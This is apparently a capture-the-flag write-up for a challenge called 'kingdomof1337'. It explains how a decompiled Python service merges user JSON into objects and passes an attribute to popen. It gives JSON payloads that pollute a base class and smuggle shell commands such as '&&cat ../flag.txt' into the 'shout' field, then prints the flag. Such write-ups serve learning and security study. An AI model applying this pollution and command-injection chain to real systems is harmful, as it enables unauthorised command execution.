# kingdomof1337

## Challenge
The Target is to get the flag that is somewhere on the server where vuln.py is running. The servers vuln.py could be run by connecting to it using netcat. A pyc file of vuln.py was provided.

## Solution
Using a pyc decompiler like pycdc, one can get most of the python code of vuln.py. using a debugger like trepan-xpy, one can understand it further (see `decompiled.py` for my decompilation). The important functions are `run_message` and `King.modt`:
```python
class King(Kingdom):    
    def motd(self):
        say = self.shout if hasattr(self, 'shout') else 'I have no messages today.'
        if not hasattr(self, 'shout'):
            return say

        return f'''{popen('echo ' + say).read().strip()}!'''


def run_message(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                run_message(v, dst.get(k))
                continue
            dst[k] = v
            continue
        if hasattr(dst, k) and type(v) == dict:
            run_message(v, getattr(dst, k))
            continue
        setattr(dst, k, v)
```
After creating instances of the classes `Pawn` and `King` and after checking if the users input is in json format and converting it to a dict, the `run_message` function will be called, with the dict as first arg, and the pawn instance as second arg. Afterwards, `king.modt` will be called (`king` is the instance of `King`).

We want `king.modt` to return `f'''{popen('echo ' + say).read().strip()}!'''`, so we can inject bash code. Therefore, we somehow need to add a `shout` attribute to king during `run_message`. This can be accomplished using following json:
```json
{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"our_message"}}}}}
```

Why does this work? Well, i won't tell you. You will probably learn more if you try to understand it yourself. You can use google and a debugger like trepan-xpy.

next, we take a look on how the king shouts our message. it uses:<br />
`popen("echo " + say).read().strip()`  <br />
So, it just runs the bash command 'echo our_message'. We can easily inject some code there, for example by using:<br />
`{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&ls"}}}}}`<br />
to get the files in the current directory. using:<br />
`{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&ls ../"}}}}}`<br />
we see where the flag is, and print it using:<br />
`{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&cat ../flag.txt"}}}}}`  <br />
<br />
It outputs the flag: DBH{p0llu710n_15_n0t_jU57_4_j4v45cr1p7_th1nG}
